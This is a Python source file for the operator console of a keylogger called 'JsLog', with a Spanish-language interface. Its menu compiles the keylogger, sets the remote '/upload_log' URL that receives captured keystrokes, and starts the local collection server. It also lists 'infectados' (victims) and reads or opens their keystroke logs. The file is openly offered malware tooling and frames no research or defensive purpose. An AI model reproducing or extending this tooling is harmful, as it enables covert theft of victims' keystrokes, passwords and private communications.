import os
import random
import argparse
import subprocess
import platform
import psutil
from colorama import init, Fore, Style

init(autoreset=True)

def cargar_banner_aleatorio():
    banners_dir = 'banners'
    banners = [f for f in os.listdir(banners_dir) if f.endswith('.txt')]
    if banners:
        banner_file = random.choice(banners)
        try:
            with open(os.path.join(banners_dir, banner_file), 'r', encoding='utf-8') as f:
                return f.read()
        except UnicodeDecodeError:
            print(f"{Fore.RED}Error: No se pudo leer el banner debido a un problema de codificación.")
            return "Banner no encontrado."
    return "Banner no encontrado."

def limpiar_terminal():
    if os.name == 'posix':
        os.system('clear')
    elif os.name == 'nt':
        os.system('cls')

def mostrar_banner():
    banner = rf"""{Fore.LIGHTGREEN_EX}
      _     _                                 
     | |___| |    ___   ____  ____  ___ ____ 
  _  | / __| |   / _ \ / _  |/ _  |/ _ \ '__| 
 | |_| \__ \ |__| (_) | (_| | (_| |  __/ |   
  \___/|___/_____\___/ \__, |\__, |\___|_|   
                       |___/ |___/          

        {Fore.LIGHTCYAN_EX}..::{Style.RESET_ALL}{Fore.WHITE} Desarrollado por Js {Fore.LIGHTCYAN_EX}::..{Style.RESET_ALL}
            {Fore.WHITE}https://github.com/js
    """
    print(banner)

def verificar_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    url = url.rstrip('/')
    if '/upload_log' not in url:
        url += '/upload_log'
    return url

def guardar_url(url):
    ruta = os.path.join('keylogger', 'server.txt')
    with open(ruta, 'w') as archivo:
        archivo.write(url)

def leer_url():
    ruta = os.path.join('keylogger', 'server.txt')
    if os.path.exists(ruta) and os.path.getsize(ruta) > 0:
        with open(ruta, 'r') as archivo:
            return archivo.read().strip()
    return None

def cambiar_url(nueva_url=None):
    if nueva_url is None:
        while True:
            nueva_url = input(f"{Fore.LIGHTGREEN_EX}URL de su servidor:{Fore.WHITE} ")
            if ' ' in nueva_url:
                print(f"{Fore.RED}Error: La URL no debe contener espacios.")
                continue
            nueva_url = verificar_url(nueva_url)
            guardar_url(nueva_url)
            print(f"{Fore.LIGHTBLUE_EX}URL actualizada a: {Fore.WHITE}{nueva_url}")
            break
    else:
        nueva_url = verificar_url(nueva_url)
        guardar_url(nueva_url)
        print(f"{Fore.LIGHTBLUE_EX}URL actualizada a: {Fore.WHITE}{nueva_url}")

def leer_archivo(archivo):
    path = os.path.join('server/keylogs', archivo)
    if os.path.exists(path):
        with open(path, 'r') as f:
            print(f.read())
    else:
        print(f"{Fore.RED}Archivo no encontrado.")

def abrir_archivo(path):
    if os.path.exists(path):
        try:
            if os.name == 'posix':
                os.system(f'open "{path}"')
            elif os.name == 'nt':
                os.system(f'start "" "{path}"')
        except Exception as e:
            print(f"{Fore.RED}Error al abrir el archivo: {e}")
    else:
        print(f"{Fore.RED}Archivo no encontrado: {path}")
        
def cerrar_servidor():
    servidor_encontrado = False
    for proceso in psutil.process_iter(['pid', 'name', 'cmdline']):
        if 'python' in proceso.info['name'] and 'server.py' in proceso.info['cmdline']:
            try:
                proceso.terminate()
                proceso.wait()
                print(f"{Fore.GREEN}Servidor detenido correctamente.")
                servidor_encontrado = True
            except psutil.NoSuchProcess:
                print(f"{Fore.RED}El proceso ya no existe.")
                servidor_encontrado = True
            except psutil.AccessDenied:
                print(f"{Fore.RED}No se tiene permiso para terminar el proceso.")
                servidor_encontrado = True

    if not servidor_encontrado:
        print(f"{Fore.RED}No hay servidor corriendo.")

def ejecutar_comando(opcion):
    if opcion == '01':
        try:
            subprocess.run(['python', 'compilar.py'], check=True)
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}Error al ejecutar compilar.py: {e}")
    elif opcion == '02':
        if os.path.exists('server/keylogs/'):
            archivos = os.listdir('server/keylogs/')
            for archivo in archivos:
                print(archivo)
        else:
            print(f"{Fore.RED}No se encontraron víctimas en el servidor local.")
    elif opcion.startswith('03') or opcion.startswith('3'):
        if len(opcion.split(' ', 1)) > 1:
            archivo = opcion.split(' ', 1)[1].strip()
        else:
            archivo = input(f"{Fore.LIGHTGREEN_EX}Nombre del archivo: {Fore.WHITE}").strip()

        leer_archivo(archivo)

    elif opcion == '04' or opcion == '4' or opcion.startswith('04 ') or opcion.startswith('4 '):
        if len(opcion.split(' ', 1)) > 1:
         archivo = opcion.split(' ', 1)[1].strip()
        else:
            archivo = input(f"{Fore.LIGHTGREEN_EX}Nombre del archivo: {Fore.WHITE}").strip()
    
        path = os.path.join('server/keylogs', archivo)
        abrir_archivo(path)


    elif opcion == '05':
        while True:
            puerto = input(f"{Fore.LIGHTGREEN_EX}Ingrese el puerto: {Fore.WHITE}")
            puerto = puerto.replace(" ", "")
            if puerto.isdigit() and 1024 <= int(puerto) <= 65535:
                try:
                    with open('server/.env', 'r') as archivo:
                        lineas = archivo.readlines()
                    with open('server/.env', 'w') as archivo:
                        for linea in lineas:
                            if linea.startswith("PORT="):
                                archivo.write(f"PORT={puerto}\n")
                            else:
                                archivo.write(linea)
                    break
                except Exception as e:
                    print(f"{Fore.RED}Error al actualizar el archivo .env: {e}")
                    return
            else:
                print(f"{Fore.RED}Error: El puerto debe estar entre 1024 y 65535.")
    
        try:
            with open('server/.env', 'r') as archivo:
                contenido = archivo.read()
                puerto_guardado = None
                for linea in contenido.splitlines():
                    if linea.startswith("PORT="):
                        puerto_guardado = linea.split('=')[1].strip()
                        break
                if puerto_guardado:
                    print(f"{Fore.GREEN}Iniciando servidor...")
                else:
                    print(f"{Fore.RED}Error: No se pudo leer el puerto guardado.")
                    return
        except Exception as e:
            print(f"{Fore.RED}Error al leer el archivo de configuración: {e}")
            return
    
        sistema = platform.system().lower()
    
        if sistema == 'windows':
            subprocess.Popen(['start', 'cmd', '/K', 'title JsLogger - Servidor && cd server && python server.py'], shell=True)
        elif sistema == 'linux' or sistema == 'darwin':
            subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', 'echo -ne "\033]0;JsLogger - Servidor\007" && cd server && python server.py; exec bash'], shell=False)
        else:
            print(f"{Fore.RED}Sistema no compatible para abrir una nueva terminal.")
    
        print(f"{Fore.GREEN}Servidor iniciado correctamente.")
    elif opcion == '06':
        cerrar_servidor()
    elif opcion == '07':
        print(f"{Fore.LIGHTBLUE_EX}URL configurada: {Fore.WHITE}{leer_url()}")
    elif opcion == '08':
        cambiar_url()
    elif opcion.startswith('8 ') or opcion.startswith('08 '):
        nueva_url = opcion.split(' ', 1)[1].strip()
        cambiar_url(nueva_url)
    elif opcion == '09':
        print(f"{Fore.LIGHTGREEN_EX}[{Fore.WHITE}01{Fore.LIGHTGREEN_EX}]{Fore.WHITE} Compilar Keylogger   {Fore.LIGHTGREEN_EX}[{Fore.WHITE}05{Fore.LIGHTGREEN_EX}]{Fore.WHITE} Iniciar servidor local")
        print(f"{Fore.LIGHTGREEN_EX}[{Fore.WHITE}02{Fore.LIGHTGREEN_EX}]{Fore.WHITE} Listar infectados    {Fore.LIGHTGREEN_EX}[{Fore.WHITE}06{Fore.LIGHTGREEN_EX}]{Fore.WHITE} Cerrar servidor local")
        print(f"{Fore.LIGHTGREEN_EX}[{Fore.WHITE}03{Fore.LIGHTGREEN_EX}]{Fore.WHITE} Leer pulsaciones     {Fore.LIGHTGREEN_EX}[{Fore.WHITE}07{Fore.LIGHTGREEN_EX}]{Fore.WHITE} Ver URL del servidor actual")
        print(f"{Fore.LIGHTGREEN_EX}[{Fore.WHITE}04{Fore.LIGHTGREEN_EX}]{Fore.WHITE} Abrir infectado      {Fore.LIGHTGREEN_EX}[{Fore.WHITE}08{Fore.LIGHTGREEN_EX}]{Fore.WHITE} Cambiar URL del servidor actual")
        print(f"{Fore.LIGHTGREEN_EX}[{Fore.WHITE}00{Fore.LIGHTGREEN_EX}]{Fore.WHITE} Salir                {Fore.LIGHTGREEN_EX}[{Fore.WHITE}09{Fore.LIGHTGREEN_EX}]{Fore.WHITE} Abrir menú")

def main():
    url_guardada = leer_url()
    if not url_guardada:
        limpiar_terminal()
        mostrar_banner()
        cambiar_url()

    parser = argparse.ArgumentParser(description="JsLog - Keylogger")
    parser.add_argument('-1', '-c', '--compilar', action='store_true', help="Compilar Keylogger")
    parser.add_argument('-2', '-ls', '--listar', action='store_true', help="Listar infectados")
    parser.add_argument('-3', '-v', '--ver-archivo', type=str, help="Leer archivo específico")
    parser.add_argument('-4', '-o', '--ejecutar-archivo', type=str, help="Ejecutar archivo específico")
    parser.add_argument('-5', '-iS', '--iniciar-servidor', action='store_true', help="Iniciar servidor local")
    parser.add_argument('-6', '-dS', '--cerrar-servidor', action='store_true', help="Cerrar servidor local")
    parser.add_argument('-7', '-u', '--ver-url', action='store_true', help="Ver URL del servidor actual")
    parser.add_argument('-8', '-cU', '--cambiar-url', type=str, help="Cambiar URL del servidor")
    parser.add_argument('-9', '-m', '--menu', action='store_true', help="Abrir menú")
    args = parser.parse_args()

    if args.compilar:
        ejecutar_comando('01')
    elif args.listar:
        ejecutar_comando('02')
    elif args.iniciar_servidor:
        ejecutar_comando('05')
    elif args.cerrar_servidor:
        ejecutar_comando('06')
    elif args.ver_url:
        ejecutar_comando('07')
    elif args.cambiar_url:
        cambiar_url(args.cambiar_url)
    elif args.ver_archivo:
        leer_archivo(args.ver_archivo)
    elif args.ejecutar_archivo:
        archivo = args.ejecutar_archivo
        path = os.path.join('server/keylogs', archivo)
        if os.path.exists(path):
            if os.name == 'posix':
                os.system(f"open {path}")
            elif os.name == 'nt':
                os.system(f"start {path}")
        else:
            print(f"{Fore.RED}Archivo no encontrado.")
    elif args.menu:
        ejecutar_comando('09')
    else:
        limpiar_terminal()
        mostrar_banner()
        print(f"{Fore.LIGHTGREEN_EX}[{Fore.WHITE}01{Fore.LIGHTGREEN_EX}]{Fore.WHITE} Compilar Keylogger   {Fore.LIGHTGREEN_EX}[{Fore.WHITE}05{Fore.LIGHTGREEN_EX}]{Fore.WHITE} Iniciar servidor local")
        print(f"{Fore.LIGHTGREEN_EX}[{Fore.WHITE}02{Fore.LIGHTGREEN_EX}]{Fore.WHITE} Listar infectados    {Fore.LIGHTGREEN_EX}[{Fore.WHITE}06{Fore.LIGHTGREEN_EX}]{Fore.WHITE} Cerrar servidor local")
        print(f"{Fore.LIGHTGREEN_EX}[{Fore.WHITE}03{Fore.LIGHTGREEN_EX}]{Fore.WHITE} Leer pulsaciones     {Fore.LIGHTGREEN_EX}[{Fore.WHITE}07{Fore.LIGHTGREEN_EX}]{Fore.WHITE} Ver URL del servidor actual")
        print(f"{Fore.LIGHTGREEN_EX}[{Fore.WHITE}04{Fore.LIGHTGREEN_EX}]{Fore.WHITE} Abrir infectado      {Fore.LIGHTGREEN_EX}[{Fore.WHITE}08{Fore.LIGHTGREEN_EX}]{Fore.WHITE} Cambiar URL del servidor actual")
        print(f"{Fore.LIGHTGREEN_EX}[{Fore.WHITE}00{Fore.LIGHTGREEN_EX}]{Fore.WHITE} Salir                {Fore.LIGHTGREEN_EX}[{Fore.WHITE}09{Fore.LIGHTGREEN_EX}]{Fore.WHITE} Abrir menú")

        while True:
            opcion = input(f"\n{Fore.LIGHTGREEN_EX}> {Fore.WHITE}")

            if opcion == '00' or opcion == '0':
                print(f"{Fore.LIGHTGREEN_EX}{cargar_banner_aleatorio()}") 
                print(f"\n{Fore.LIGHTCYAN_EX}.: {Style.RESET_ALL}{Fore.WHITE}Desarrollado por Js{Style.RESET_ALL}\n{Fore.LIGHTCYAN_EX}.: {Style.RESET_ALL}{Fore.WHITE}https://github.com/js")
                break

            if opcion.startswith('8 ') or opcion.startswith('08 '):
                nueva_url = opcion[2:].strip()
                cambiar_url(nueva_url)
                continue
            
            if not opcion.isdigit() and not opcion.startswith('03') and not opcion.startswith('3') and not opcion.startswith('04') and not opcion.startswith('4'):
                print(f"{Fore.RED}Opción no válida.")
                continue

            opcion = str(opcion).zfill(2)

            ejecutar_comando(opcion)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        limpiar_terminal()
        print(f"{Fore.LIGHTGREEN_EX}{cargar_banner_aleatorio()}")
        print(f"\n{Fore.LIGHTCYAN_EX}.: {Style.RESET_ALL}{Fore.WHITE}Desarrollado por Js{Style.RESET_ALL}\n{Fore.LIGHTCYAN_EX}.: {Style.RESET_ALL}{Fore.WHITE}https://github.com/js\n\n{Fore.LIGHTCYAN_EX}.: {Fore.WHITE}Ejecutable: {Fore.LIGHTCYAN_EX}jslog")
